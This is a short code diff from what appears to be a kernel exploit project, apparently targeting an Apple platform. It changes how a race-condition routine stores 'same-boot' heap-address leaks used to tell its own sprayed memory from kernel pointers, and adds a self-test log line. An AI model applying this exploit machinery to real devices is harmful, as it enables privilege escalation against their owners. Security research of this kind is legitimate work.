@@ -89,14 +89,17 @@ static void *p177_racer2(void *arg) {
     Lf(@"[*] same-boot anchor set: %d distinct%@", nAnchors,
        nAnchors ? @"" : @" (harvest produced none — tags stay random-marker)");
     if (anchor) {
-        uint64_t aset[4] = {0};
-        int an = LabHeapAnchorsSameBoot(4, aset);
+        uint64_t aset[8] = {0};
+        int an = LabHeapAnchorsSameBoot(8, aset);
         memcpy(cs2_ctx.heap_anchors, aset, sizeof(aset));
         cs2_ctx.heap_anchor_n = an;
         cs2_ctx.heap_anchor = anchor;
         cs2_ctx.heap_anchor_armed = 1;
         Lf(@"[*] fil tag ARMED with same-boot heap leak 0x%llx (excluded from every kptr classifier; own-page class only)",
            (unsigned long long)anchor);
+        Lf(@"[*] exclusion self-test: the running binary classifies its own fill %@ "
+           @"(set=%d/8 loaded; OWN = classifiers safe, FOREIGN = rebuild required)",
+           cs2_own_anchor(anchor) ? @"OWN" : @"FOREIGN -- BROKEN", an);
     } else {
         memset(cs2_ctx.heap_anchors, 0, sizeof(cs2_ctx.heap_anchors));
         cs2_ctx.heap_anchor_n = 0;
